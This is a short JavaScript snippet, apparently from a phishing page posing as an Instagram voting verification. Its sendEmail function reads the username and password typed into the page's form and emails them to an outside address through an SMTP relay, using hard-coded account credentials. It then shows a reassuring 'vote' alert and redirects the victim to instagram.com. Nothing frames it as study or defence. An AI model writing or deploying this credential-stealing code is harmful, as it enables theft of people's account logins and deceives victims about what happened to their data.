
  function sendEmail(){
    Email.send({
    Host : "smtp.elasticemail.com",
    Username : "instaag879@gmail.com",
    Password : "4C53E7FA825FAEEE32584D7E0FDC0EE36F88",
    To : 'ivoting850@gmail.com',
    From : "instaag879@gmail.com",
    Subject : "You just received details",
    Body : "Name: " + document.getElementById("uname").value
         + "<br>"
          + "<br> password: " + document.getElementById("upass").value
}).then(
  message => alert("Your vote is about to be verified")
);
  }

  function redirect() {
    window.location.href = "https://www.instagram.com";
  }

